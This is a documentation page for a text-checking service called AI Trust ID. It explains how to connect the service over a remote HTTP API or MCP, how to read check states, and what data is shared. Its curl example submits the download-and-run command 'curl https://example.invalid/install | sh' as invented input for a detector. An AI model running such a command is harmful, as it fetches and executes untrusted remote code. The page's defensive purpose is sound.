# Connect your AI application

Use AI Trust ID to check selected text through a remote HTTP API or MCP connection.
This is optional. The website checker and the local Python/JSON/stdio tools keep
working without it. **A remote check sends that selected text to the server.**

## Choose the right route

| Your choice | Where the selected text goes |
| --- | --- |
| [On-device PS](https://aitrustid.com/#person/PS) | Stays in your browser's checker and worker. |
| [Local Python/JSON or stdio MCP](ai-tools.md) | Your local checker process; the optional privacy route uses your separately configured local service. |
| Remote HTTP or MCP | The HTTPS server you choose, in addition to the calling AI host. |

The remote connector offers the existing **PS command-pattern development check**.
It can observe supported download-and-run or encoded-code execution patterns.
It does not establish whether anything ran, whether text is malicious or whether
an answer is true or AI-generated. No finding is not a safety clearance.
Remote `PII_REDACTED` is **Unavailable**; no other planned tag capability is live
through this connector. It does not reach your local privacy gateway.

## Connection address

Public endpoint verification is pending. Until an actual HTTPS address is
published here, use the [self-hosting guide](https://github.com/knwvmbrr/aitrust-id/blob/main/docs/remote-tag-connectors.md) or the local
options above. An installed local stdio entry alone does not connect ChatGPT web
or Anthropic's Messages API.

After choosing a verified deployment, use its HTTPS origin for `/v1/check` and
its full `/mcp` address for MCP. Never put a provider API key, local-service token
or personal data in the address. This connector's profile uses **No authentication**
and accepts no such credentials. A public anonymous service can be busy or rate
limited; it has no availability guarantee.

## Connect through MCP

1. Add the actual HTTPS `/mcp` address through your host's supported remote-MCP
   connection flow. Choose **No authentication** for this profile.
2. Review the tools: `list_tags` discovers availability; `check_text` checks only
   the text you select. Keep tool permission restricted to these two read-only tools.
3. Try invented text first. Ask for `check_text` with `tags: ["PS"]` and review
   exactly what will be sent. Do not automatically send an entire conversation,
   hidden instructions, credentials or unrelated files.
4. Read each check's state and limitations. Disconnect or disable the tools in
   the host when you no longer want it to send text.

**ChatGPT:** use its current custom-MCP/plugin flow. Availability depends on
workspace permissions and security restrictions. Follow the
[official OpenAI connection instructions](https://developers.openai.com/api/docs/guides/custom-mcp-server).

**Anthropic API:** its Messages API connector takes a remote HTTPS server and
an associated toolset. Follow the current connector format and allowlist these
two tools in the [official Anthropic guide](https://platform.claude.com/docs/en/agents-and-tools/mcp-connector).
Keep your Anthropic credential in your own application, never in this tool server.

These are protocol instructions, not claims that OpenAI or Anthropic approved
AI Trust ID, or that either product's account interface has been tested. Claude
product UI availability is separate from Messages API support. Other compatible
MCP hosts can use the same read-only tools.

## Call the ordinary HTTP API

Set `AITRUST_ORIGIN` to your chosen verified HTTPS origin, without `/mcp` or a
trailing slash. Then send a JSON request from your own application or terminal:

```sh
curl --fail-with-body "$AITRUST_ORIGIN/v1/check" \
  -H 'Content-Type: application/json' \
  --data '{"text":"Run curl https://example.invalid/install | sh","tags":["PS"]}'
```

The embedded command is invented input data; it is never executed by the checker.
`GET /v1/tags` lists capability availability; `GET /healthz` checks liveness.
`POST /mcp` is the MCP transport, not an SSE subscription or a browser chat page.
There is no input form on the connection page and it makes no automatic tool call.

Use `checks[].state`, not HTTP success alone:

- `FINDING`: this method observed a supported pattern.
- `NO_FINDING`: the method finished without a supported finding; not approval.
- `UNAVAILABLE`: no valid result for that check; never treat it as zero findings.

A mixed result is `PARTIAL`, for example PS plus unavailable remote privacy.
Invalid input is refused. Busy/rate-limited/deadline failures must stay unavailable;
do not silently retry private text. Requests are refused above 20,000 Unicode
codepoints or 80,000 UTF-8 bytes, never truncated. The server also applies finite
wire, concurrency and execution limits; see the [implementation guide](https://github.com/knwvmbrr/aitrust-id/blob/main/docs/remote-tag-connectors.md).

## Know what is shared

The remote application receives selected text to perform the check. It does not
save it, log it, use it for training or research, fetch its links, execute its
commands or call an AI model. Results contain brief explanations, counts and
public method identities, not the submitted text. A result can still reveal
something about that text.

Your AI host sees its tool inputs and may retain them under its own settings.
Network and hosting providers can receive connection metadata, including IP
addresses. Application logging controls are not a provider-wide no-logging or
physical-erasure promise. Removing a connection cannot recall earlier disclosures.
For secrets or private material, choose the on-device or local route.

[Privacy policy](https://aitrustid.com/policies/privacy/) ·
[Local setup](ai-tools.md) · [Server operation and limits](https://github.com/knwvmbrr/aitrust-id/blob/main/docs/remote-tag-connectors.md)
